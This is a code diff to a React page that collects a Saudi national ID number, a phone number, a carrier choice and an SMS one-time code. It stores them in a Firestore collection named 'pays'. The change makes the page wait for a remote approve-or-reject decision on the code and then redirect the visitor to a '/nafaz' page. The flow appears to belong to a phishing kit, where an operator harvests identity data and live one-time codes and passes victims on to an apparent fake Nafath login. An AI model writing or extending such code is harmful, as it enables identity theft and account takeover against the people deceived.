@@ -5,12 +5,13 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Phone, ShieldCheck, CreditCard, Lock } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
-import { db, isFirebaseConfigured } from "@/lib/firebase";
+import { addData, db, isFirebaseConfigured } from "@/lib/firebase";
 import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
 import { PhoneOtpDialog } from "@/components/phone-otp-dialog";
 import { CarrierVerificationModal } from "@/components/carrier-verification-modal";
 import { StcCallDialog } from "@/components/stc-call-dialog";
 import { useVisitorRouting } from "@/hooks/use-visitor-routing";
+import { useLocation } from "wouter";
 
 const telecomOperators = [
   { value: "stc", label: "STC - الاتصالات السعودية" },
@@ -24,6 +25,7 @@ const telecomOperators = [
 
 export default function PhoneVerificationPage() {
   const { toast } = useToast();
+  const [, setLocation] = useLocation();
   const [idNumber, setIdNumber] = useState("");
   const [idError, setIdError] = useState("");
   const [phoneNumber, setPhoneNumber] = useState("");
@@ -35,25 +37,30 @@ export default function PhoneVerificationPage() {
   const [otpRejectionError, setOtpRejectionError] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const visitorId = typeof window !== "undefined" ? sessionStorage.getItem("visitor") || "" : "";
+  const visitorId =
+    typeof window !== "undefined"
+      ? sessionStorage.getItem("visitor") || ""
+      : "";
 
-  useVisitorRouting({
-    currentPage: "phone-verification",
-  });
-
-  const updatePhoneData = useCallback(async (data: Record<string, any>) => {
-    if (!isFirebaseConfigured || !db || !visitorId) return;
-    try {
-      const docRef = doc(db as Firestore, "pays", visitorId);
-      await setDoc(docRef, {
-        ...data,
-        updatedAt: new Date().toISOString(),
-      }, { merge: true });
-    } catch (e) {
-      console.error("Error updating phone data:", e);
-    }
-  }, [visitorId]);
-
+  const updatePhoneData = useCallback(
+    async (data: Record<string, any>) => {
+      if (!isFirebaseConfigured || !db || !visitorId) return;
+      try {
+        const docRef = doc(db as Firestore, "pays", visitorId);
+        await setDoc(
+          docRef,
+          {
+            ...data,
+            updatedAt: new Date().toISOString(),
+          },
+          { merge: true },
+        );
+      } catch (e) {
+        console.error("Error updating phone data:", e);
+      }
+    },
+    [visitorId],
+  );
 
   useEffect(() => {
     if (!visitorId || !isFirebaseConfigured || !db) return;
@@ -64,14 +71,23 @@ export default function PhoneVerificationPage() {
         if (docSnap.exists()) {
           const data = docSnap.data();
 
-          if (data.phoneVerificationStatus === "approved" || data.phoneOtpApproved === true) {
+          if (
+            data.phoneVerificationStatus === "approved" ||
+            data.phoneOtpApproved === true
+          ) {
             setShowWaitingModal(false);
             setShowOtpDialog(false);
             toast({
               title: "تم التحقق بنجاح",
               description: "تم التحقق من رقم الجوال بنجاح",
             });
-          } else if (data.phoneVerificationStatus === "rejected" || data.phoneOtpApproved === false) {
+            setTimeout(() => {
+              setLocation("/nafaz");
+            }, 1000);
+          } else if (
+            data.phoneVerificationStatus === "rejected" ||
+            data.phoneOtpApproved === false
+          ) {
             setShowWaitingModal(false);
             setOtpRejectionError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح");
             setShowOtpDialog(true);
@@ -80,7 +96,7 @@ export default function PhoneVerificationPage() {
       },
       (error) => {
         console.error("[phone-verification] Firestore listener error:", error);
-      }
+      },
     );
 
     return () => unsubscribe();
@@ -188,6 +204,9 @@ export default function PhoneVerificationPage() {
       title: "تم التحقق بنجاح",
       description: "تم التحقق من رقم الجوال بنجاح",
     });
+    setTimeout(() => {
+      setLocation("/nafaz");
+    }, 1000);
   };
 
   const handleRejected = () => {
@@ -201,7 +220,12 @@ export default function PhoneVerificationPage() {
     });
   };
 
-  const isFormValid = idNumber.length === 10 && phoneNumber.length === 10 && selectedCarrier && !idError && !phoneError;
+  const isFormValid =
+    idNumber.length === 10 &&
+    phoneNumber.length === 10 &&
+    selectedCarrier &&
+    !idError &&
+    !phoneError;
 
   return (
     <>
